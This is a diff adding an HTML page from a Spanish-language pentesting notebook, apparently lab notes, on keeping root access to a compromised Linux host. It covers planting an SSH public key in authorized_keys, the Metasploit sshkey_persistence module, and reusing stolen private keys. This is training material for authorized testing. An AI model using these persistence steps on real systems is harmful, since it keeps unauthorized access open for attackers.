@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Clave RSA | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="clave-rsa">
+          <div class="note-tabbar">
+            <span>Clave RSA</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Post-Explotación/Linux/Persistencia</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">post-explotación / linux / persistencia</p>
+            <h2>Clave RSA</h2>
+
+            <p>Añadir claves SSH a authorized_keys permite mantener acceso sin contraseña. Es una técnica de persistencia que debe documentarse y revertirse tras la práctica o pentest.</p>
+
+            <h2>Manual</h2>
+            <section class="code-card">
+              <h3>Kali: Creamos un par de claves</h3>
+              <pre><code>ssh-keygen # INTRO, INTRO
+# Leemos la clave pública, quitamos saltos de línea, copiamos output al clipboard
+cat ~/.ssh/id_rsa.pub | tr -d &#x27;\n&#x27; | xclip -sel clip</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Bash pwneada y como root: Pegamos la clave creada anteriormente</h3>
+              <pre><code>cd /root/.ssh
+nano authorized_keys</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Nos conectamos a la víctima</h3>
+              <pre><code>ssh root@&lt;ip_target&gt;</code></pre>
+            </section>
+            <h2>Metasploit</h2>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># Desde Metasploit si tenemos una sesión como root abierta, podemos crear un par de claves rsa y guardarnos la clave privada para conectarnos siempre que queramos
+use post/linux/manage/sshkey_persistence
+set SESSION 4
+set CREATESSHFOLDER true
+exploit</code></pre>
+            </section>
+            <figure class="note-figure">
+              <img src="https://assets.ine.com/lab/learningpath/f108cb9bf19dc5d1718fc9f350694a524ca6b0c4372324e469e9294924c83117.png" alt="Content Image" />
+            </figure>
+            <figure class="note-figure">
+              <img src="/notebook/assets/obsidian/linux-ssh-key-persistence.png" alt="Resultado de persistencia con clave SSH" />
+            </figure>
+            <p><code>SSH Private Key: /root/.msf4/loot/20240716164352_default_192.217.38.3_id_rsa_606834.txt</code></p>
+            <section class="code-card">
+              <h3>Comandos</h3>
+              <pre><code># Nos copiamos el archivo en nuestra máquina Kali
+cp  /root/.msf4/loot/..._id_rsa_606834.txt ssh_key
+# Cambiamos los permisos, si no ssh descarta la clave priv
+chmod 0400 ssh_key
+# Nos conectamos
+ssh -i ssh_key root@demo.ine.local</code></pre>
+            </section>
+            <p>Nota:       Del mismo modo, si nos encontramos una clave privada, nos la podemos guardar y tener acceso al sistema aunque el usuario cambie de contraseña</p>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>linux</span>
+              <span>post_explotacion</span>
+              <span>persistencia</span>
+              <span>ssh</span>
+              <span>id_rsa</span>
+              <span>authorized_keys</span>
+              <span>metasploit</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
